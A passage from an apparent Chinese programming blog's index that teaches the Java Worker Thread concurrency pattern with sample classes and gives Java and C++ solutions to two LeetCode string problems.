class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"    making RealData("</span> + count + <span class="string">", "</span> + c + <span class="string">") END"</span>);</span><br><span class="line">		<span class="keyword">this</span>.content = <span class="keyword">new</span> String(buffer);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> content;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Future模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Worker Thread 模式</title>
    <url>/2018/10/10/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/8.Worker%20Thread%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Worker-Thread-模式"><a href="#Worker-Thread-模式" class="headerlink" title="Worker Thread 模式"></a>Worker Thread 模式</h2><p>Worker的意思是工作的人，劳动者。在Worker Thread模式中，工人线程（worker thread）会逐个取回工作并进行处理。当所有的工作全部完成之后，工人线程会等待新的工作到来。</p>
<p>Worker Thread模式也被称作为Background Thread（背景线程）模式。另外，如果从“保存多个工人线程的场所”这一点看，我们也可以称这种模式为Thread Pool（线程池）模式。</p>
<h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>下表列举了示例程序中的所有类。示例程序的行为如下。</p>
<p>ClientThread类的线程会向Channel类发送工作请求（委托）</p>
<p>Channel类的实例雇佣了五个工人线程（WorkerThread）进行工作。所有工人线程都在等待工作请求的到来。</p>
<p>工人的请求到来之后，工人线程会从Channel哪里获取一项工作请求并开始工作。工作完成后，工人线程会回到Channel哪里等待下一项工作请求。</p>
<h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Main</td>
<td>测试程序行为的类</td>
</tr>
<tr>
<td>ClientThread</td>
<td>表示发出工作请求的线程的类</td>
</tr>
<tr>
<td>Request</td>
<td>可以工作请求的类</td>
</tr>
<tr>
<td>Channel</td>
<td>接收工作请求并将工作请求交给工人线程的类</td>
</tr>
<tr>
<td>WorkerThread</td>
<td>表示工人线程的类</td>
</tr>
</tbody></table>
<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><p>Main类会创建一个雇佣了五个工人线程的Channel实例，并将其共享给三个ClientThread（A、B、C）。</p>
<p>Main类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Channel channel = <span class="keyword">new</span> Channel(<span class="number">5</span>);</span><br><span class="line">		</span><br><span class="line">		channel.startWorkers();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"A"</span>, channel).start();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"B"</span>, channel).start();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(<span class="string">"C"</span>, channel).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ClientThread类"><a href="#ClientThread类" class="headerlink" title="ClientThread类"></a>ClientThread类</h3><p>ClientThread类是发送工作请求的类。“发送工作请求”这个行为对应的是示例程序中的以下处理</p>
<ol>
<li>创建Request实例</li>
<li>将该实例传递给Channel类的putRequest方法</li>
</ol>
<p>为了让程序行为有些变化，这里让程序sleep一段随机长的时间。</p>
<p>发送工作请求的ClientThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Channel channel;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ClientThread</span><span class="params">(String name, Channel channel)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.channel = channel;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;<span class="keyword">true</span>;i++) &#123;</span><br><span class="line">				Request request = <span class="keyword">new</span> Request(getName(), i);</span><br><span class="line">				channel.putRequest(request);</span><br><span class="line">				Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">			&#125; </span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			<span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Request类"><a href="#Request类" class="headerlink" title="Request类"></a>Request类</h3><p>Request类是表示工作请求的类。</p>
<p>name字段表示发送请求的委托者的名字，number字段表示请求的编号。在示例程序中，name的值是A、B、C之一，number的只是0，1，2，3.。execute方法是负责“处理”请求的方法。</p>
<p>表示工作请求的Request类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Request</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> number;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Request</span><span class="params">(String name, <span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.number = number;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(Thread.currentThread().getName()  + <span class="string">" execute "</span>  + <span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"[ Request from "</span> + name + <span class="string">" No."</span> + number + <span class="string">" ]"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Channel类"><a href="#Channel类" class="headerlink" title="Channel类"></a>Channel类</h3><p>Channel类是负责传递工作请求以及保存工人线程的类。</p>
<p>为了传递工作请求，我们在Channel类中定义了requestQueue字段。该字段将扮演保存请求的队列的角色。putRequest方法用于将请求加入到队列中，takeRequest方法则用于取出队列中的请求。这里使用了Producer-Consumer模式。另外。为了实现putRequest方法和takeRequest方法，这里还使用了Guarded Suspension模式。</p>
<p>Channel勒种定义了一个用于保存工人线程的threadPool字段。threadPool是WorkerThread的数组。Channel类的构造函数会初始化threadPool字段并创建WorkerThread的实例。数组的大小由threads决定。</p>
<p>这里为工人线程赋予的名字分别为Worker-0，Worker-1，.。</p>
<p>startWorkers方法是用于启动所有工人线程的方法。</p>
<p>负责传递工作请求以及保存工人线程的Channel类</p>
<h3 id="Channel类-1"><a href="#Channel类-1" class="headerlink" title="Channel类"></a>Channel类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Channel</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_REQUEST = <span class="number">100</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Request[] requestQueue;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> WorkerThread[] threadPool;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Channel</span><span class="params">(<span class="keyword">int</span> threads)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.requestQueue = <span class="keyword">new</span> Request[MAX_REQUEST];</span><br><span class="line">		<span class="keyword">this</span>.tail = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">this</span>.head = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		threadPool = <span class="keyword">new</span> WorkerThread[threads];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; threadPool.length;i++) &#123;</span><br><span class="line">			threadPool[i] = <span class="keyword">new</span> WorkerThread(<span class="string">"Worker-"</span> + i, <span class="keyword">this</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startWorkers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; threadPool.length;i++) &#123;</span><br><span class="line">			threadPool[i].start();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">putRequest</span><span class="params">(Request request)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span>(count &gt;= requestQueue.length) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		requestQueue[tail] = request;</span><br><span class="line">		tail = (tail + <span class="number">1</span>) % requestQueue.length;</span><br><span class="line">		count++;</span><br><span class="line">		notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Request <span class="title">takeRequest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span>(count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				wait();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		Request request = requestQueue[head];</span><br><span class="line">		head = (head + <span class="number">1</span>) % requestQueue.length;</span><br><span class="line">		count--;</span><br><span class="line">		notifyAll();</span><br><span class="line">		<span class="keyword">return</span> request;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WorkerThread类"><a href="#WorkerThread类" class="headerlink" title="WorkerThread类"></a>WorkerThread类</h3><p>WorkerThread类表示工人线程的类。</p>
<p>工人线程会进行工作。“进行工作”这个处理对应示例程序中的以下处理。</p>
<ol>
<li>调用takeRequest方法从Channel的实例中获取一个Request的实例</li>
<li>调用Request的实例的execute方法</li>
</ol>
<p>工人线程一旦启动后就会一直工作。也就是说，它会一直执行“获取一个新的Request，然后调用它的execute方法”的处理。</p>
<p>表示工人线程的WorkerThread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkerThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Channel channel;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">WorkerThread</span><span class="params">(String name, Channel channel)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.channel = channel;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			Request request = channel.takeRequest();</span><br><span class="line">			request.execute();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Worker Thread 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>20. Valid Parentheses</title>
    <url>/2018/09/14/LeetCode/leetcode-000020.%20Valid%20Parentheses/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串，判断字符串是否有效。</p>
<p>有效字符串需满足：</p>
<pre><code>左括号必须用相同类型的右括号闭合。
左括号必须以正确的顺序闭合。</code></pre><p>注意空字符串可被认为是有效字符串。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"()[]&#123;&#125;"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"()"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"(]"</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"([)]"</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="示例5"><a href="#示例5" class="headerlink" title="示例5"></a>示例5</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"&#123;[]&#125;"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助栈</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><pre><code>public boolean isValid(String s) {
    Stack&lt;Character&gt; sc = new Stack&lt;&gt;();
    int len = s.length();
    for(int i = 0 ; i &lt; len ; i ++) {
        if(s.charAt(i) == &apos;(&apos;|| s.charAt(i) == &apos;{&apos;|| s.charAt(i) == &apos;[&apos;) {
            sc.push(s.charAt(i));
        } else if(sc.empty()) {
            return false;
        } else if(s.charAt(i) == &apos;)&apos;) {
            if(sc.peek() == &apos;(&apos;) {
                sc.pop();
            } else {
                return false;
            }
        } else if(s.charAt(i) == &apos;}&apos;) {
            if(sc.peek() == &apos;{&apos;) {
                sc.pop();
            } else {
                return false;
            }
        } else if(s.charAt(i) == &apos;]&apos;) { 
            if(sc.peek() == &apos;[&apos;) {
                sc.pop();
            } else {
                return false;
            }
        }
    }
    return sc.empty();
}</code></pre><p>};</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>3. 无重复字符的最长子串</title>
    <url>/2018/09/10/LeetCode/leetcode-000003-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string, find the length of the <strong>longest substring</strong> without repeating characters.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: <span class="string">"abcabcbb"</span></span><br><span class="line">Output: <span class="number">3</span> </span><br><span class="line">Explanation: The answer is <span class="string">"abc"</span>, with the length of <span class="number">3</span>.</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: <span class="string">"bbbbb"</span></span><br><span class="line">Output: <span class="number">1</span></span><br><span class="line">Explanation: The answer is <span class="string">"b"</span>, with the length of <span class="number">1</span>.</span><br></pre></td></tr></table></figure>

<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: <span class="string">"pwwkew"</span></span><br><span class="line">Output: <span class="number">3</span></span><br><span class="line">Explanation: The answer is <span class="string">"wke"</span>, with the length of <span class="number">3</span>. </span><br><span class="line">             Note that the answer must be a substring, <span class="string">"pwke"</span> is a subsequence and not a substring.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：暴力破解"><a href="#解法一：暴力破解" class="headerlink" title="解法一：暴力破解"></a>解法一：暴力破解</h3><p>取该字符串的每一个连续字串，判断其是否为该字符串的最长字串。先从长度为n的子字符串开始，如果符合条件的话，直接返回n；否则从2个n-1长度的字串中，选择，以此类推。时间复杂度O(n*n*n)</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">                <span class="keyword">if</span> (allUnique(s, i, j)) ans = Math.max(ans, j - i);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">allUnique</span><span class="params">(String s, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        Set&lt;Character&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">            Character ch = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (set.contains(ch)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            set.add(ch);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-超时了"><a href="#CPP-超时了" class="headerlink" title="CPP-超时了"></a>CPP-超时了</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isUniqueSubString</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; s, <span class="keyword">int</span> <span class="built_in">begin</span>, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">char</span>&gt; chars;</span><br><span class="line">        <span class="keyword">int</span> total = <span class="built_in">begin</span> + length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="built_in">begin</span>; i &lt; total;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars.<span class="built_in">find</span>(s.at(i)) != chars.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            chars.insert(s.at(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == s.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = length; i &gt; <span class="number">1</span>;i--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j + i &lt;= length;j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isUniqueSubString(s, j, i)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="解法二：滑动窗口法"><a href="#解法二：滑动窗口法" class="headerlink" title="解法二：滑动窗口法"></a>解法二：滑动窗口法</h3><p>滑动窗口就是从原字符串中截取一个子字符串，借助HashSet判断当前字符串是否不重复，如果不重复的话，则往右再扩一位，重复的话，则把当前窗口再顺移一位。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        Set&lt;Character&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n &amp;&amp; j &lt; n) &#123;</span><br><span class="line">            <span class="comment">// try to extend the range [i, j]</span></span><br><span class="line">            <span class="keyword">if</span> (!set.contains(s.charAt(j)))&#123;</span><br><span class="line">                set.add(s.charAt(j++));</span><br><span class="line">                ans = Math.max(ans, j - i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                set.remove(s.charAt(i++));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>拿字符串“aabbcd”举例来说。</p>
<table>
<thead>
<tr>
<th></th>
<th>窗口左坐标</th>
<th>窗口右坐标</th>
<th>当前不重复的字符集</th>
<th>最大不重复子字符串长度</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>初始化</td>
<td>0</td>
<td>0</td>
<td>空</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>加入a</td>
<td>0</td>
<td>1</td>
<td>a</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>再次加入a</td>
<td>1</td>
<td>1</td>
<td>空</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>再次加入a</td>
<td>1</td>
<td>2</td>
<td>a</td>
<td>1</td>
<td>此处是因为j的值没有自增，所以index为1的a，会再被加入依次</td>
</tr>
<tr>
<td>加入b</td>
<td>1</td>
<td>3</td>
<td>a,b</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>再次加入b</td>
<td>2</td>
<td>3</td>
<td>b</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>再次加入b</td>
<td>3</td>
<td>3</td>
<td>空</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>再次加入b</td>
<td>3</td>
<td>4</td>
<td>b</td>
<td>2</td>
<td>同上，因为j没有更新值，index为3的b会被加入多次</td>
</tr>
<tr>
<td>加入c</td>
<td>3</td>
<td>5</td>
<td>b，c</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>加入d</td>
<td>3</td>
<td>6</td>
<td>b，c，d</td>
<td>3</td>
<td></td>
</tr>
</tbody></table>
<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">char</span>&gt; chars;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt; length &amp;&amp; j &lt; length) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars.<span class="built_in">find</span>(s.at(j)) != chars.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                chars.erase(s.at(i++));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                chars.insert(s.at(j++));</span><br><span class="line">                result = <span class="built_in">max</span>(result, j - i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：滑动窗口优化版"><a href="#解法三：滑动窗口优化版" class="headerlink" title="解法三：滑动窗口优化版"></a>解法三：滑动窗口优化版</h3><p>在解法二中，每当碰到相同的值的时候，我们总是把窗口左坐标一步一步地往后移，其实，这里面存在优化的空间。比如，在区间[i, j)中，某个元素重复了，假设重复的那个索引为k，那么，我们就可以直接跳过[i,k]这段区间，直接从k+1,开始计算。</p>
<h4 id="JAVA-2"><a href="#JAVA-2" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length(), ans = <span class="number">0</span>;</span><br><span class="line">        Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;(); <span class="comment">// current index of character</span></span><br><span class="line">        <span class="comment">// try to extend the range [i, j]</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(s.charAt(j))) &#123;</span><br><span class="line">                i = Math.max(map.get(s.charAt(j)), i);</span><br><span class="line">            &#125;</span><br><span class="line">            ans = Math.max(ans, j - i + <span class="number">1</span>);</span><br><span class="line">            map.put(s.charAt(j), j + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

